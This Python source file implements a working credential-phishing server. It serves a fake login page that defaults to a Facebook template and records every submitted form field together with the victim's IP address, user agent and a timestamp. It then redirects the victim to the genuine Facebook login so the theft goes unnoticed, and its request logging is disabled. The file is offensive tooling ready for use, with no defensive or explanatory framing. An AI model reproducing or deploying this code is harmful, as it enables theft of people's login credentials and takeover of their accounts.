import os,json
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs
from datetime import datetime
from pathlib import Path

TEMPLATE_DIR=Path(__file__).parent.parent/'templates'

class PhishHandler(BaseHTTPRequestHandler):
    tpl='facebook'
    redir='https://facebook.com/login.php'
    db=None

    def log_message(self,f,*a):pass

    def do_GET(self):
        try:
            path=TEMPLATE_DIR/f'{self.tpl}.html'
            if not path.exists():
                self.send_error(404,'Template not found')
                return
            html=path.read_text(encoding='utf-8')
            self.send_response(200)
            self.send_header('Content-type','text/html;charset=utf-8')
            self.end_headers()
            self.wfile.write(html.encode())
        except Exception as e:
            self.send_error(500,str(e))

    def do_POST(self):
        try:
            cl=int(self.headers.get('Content-Length',0))
            body=self.rfile.read(cl).decode()
            data=parse_qs(body)
            ip=self.client_address[0]
            ua=self.headers.get('User-Agent','?')
            victim={
                'ip':ip,'ua':ua,'ts':datetime.now().isoformat(),
                'data':{k:data[k][0]for k in data},'tpl':self.tpl
            }
            self.db.save(victim)
            print(f'\033[1;32m[+] VICTIM! {ip} | {list(data.keys())}\033[0m')
            self.send_response(302)
            self.send_header('Location',self.redir)
            self.end_headers()
        except Exception as e:
            self.send_error(500,str(e))

class PhishServer:
    def __init__(self,port,tpl,redir,db):
        self.port=port
        PhishHandler.tpl=tpl
        PhishHandler.redir=redir
        PhishHandler.db=db
        self.server=HTTPServer(('0.0.0.0',port),PhishHandler)

    def start(self):self.server.serve_forever()
    def stop(self):self.server.shutdown()